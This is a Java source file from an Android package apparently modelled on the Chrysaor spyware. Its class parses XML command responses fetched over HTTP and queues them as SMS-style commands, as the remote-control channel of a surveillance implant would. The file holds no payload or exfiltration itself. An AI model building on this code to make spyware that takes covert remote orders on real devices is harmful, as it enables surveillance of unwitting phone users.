package com.android.chrysaoralike;

import android.util.Log;
import org.xml.sax.Attributes;
import org.xml.sax.helpers.DefaultHandler;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.util.List;

public class HttpCommandParser {
    private static final String TAG = "HttpCommandParser";
    private CommandQueue commandQueue = CommandQueue.getInstance();

    public void parse(String xml) {
        try {
            SAXParser parser = SAXParserFactory.newInstance().newSAXParser();
            XmlHandler handler = new XmlHandler();
            parser.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")), handler);
            for (SmsCommand cmd : handler.getCommands()) {
                Log.i(TAG, "Enqueuing HTTP command: " + cmd.commandId);
                commandQueue.enqueue(cmd);
            }
        } catch (Exception e) {
            Log.e(TAG, "XML parse error", e);
        }
    }

    private class XmlHandler extends DefaultHandler {
        private List<SmsCommand> commands = new ArrayList<>();
        private StringBuilder currentElement = new StringBuilder();
        private StringBuilder argBuilder = new StringBuilder();
        private boolean inArg = false;
        private String cmdId = "", ackId = "", args = "", sig = "";
        private boolean inCmd = false;

        @Override
        public void startElement(String uri, String localName, String qName, Attributes atts) {
            currentElement.setLength(0);
            if (localName.equals("cmd")) {
                inCmd = true;
            } else if (localName.equals("arg")) {
                inArg = true;
                argBuilder.setLength(0);
            } else if (localName.equals("response")) {
                // Reset on new response
                cmdId = "";
                ackId = "";
                args = "";
                sig = "";
            }
        }

        @Override
        public void characters(char[] ch, int start, int length) {
            currentElement.append(ch, start, length);
            if (inArg) {
                argBuilder.append(ch, start, length);
            }
        }

        @Override
        public void endElement(String uri, String localName, String qName) {
            String content = currentElement.toString().trim();

            if (localName.equals("cmd")) {
                cmdId = content;
                inCmd = false;
            } else if (localName.equals("a")) {
                ackId = content;
            } else if (localName.equals("arg")) {
                args = argBuilder.toString().trim();
                Log.i(TAG, "Captured arg: '" + args + "'");
                inArg = false;
            } else if (localName.equals("s")) {
                sig = content;
            } else if (localName.equals("response")) {
                // Now we have all parts; build the command
                if (!cmdId.isEmpty()) {
                    try {
                        int id = Integer.parseInt(cmdId);
                        int ack = ackId.isEmpty() ? 0 : Integer.parseInt(ackId);
                        commands.add(new SmsCommand(id, ack, args, sig, "[HTTP]"));
                        Log.i(TAG, "Parsed HTTP command: " + commands.get(commands.size() - 1));
                    } catch (NumberFormatException e) {
                        Log.w(TAG, "Invalid command ID: " + cmdId);
                    }
                }
                // Reset for next response
                cmdId = "";
                ackId = "";
                args = "";
                sig = "";
            }
        }

        public List<SmsCommand> getCommands() {
            return commands;
        }
    }
}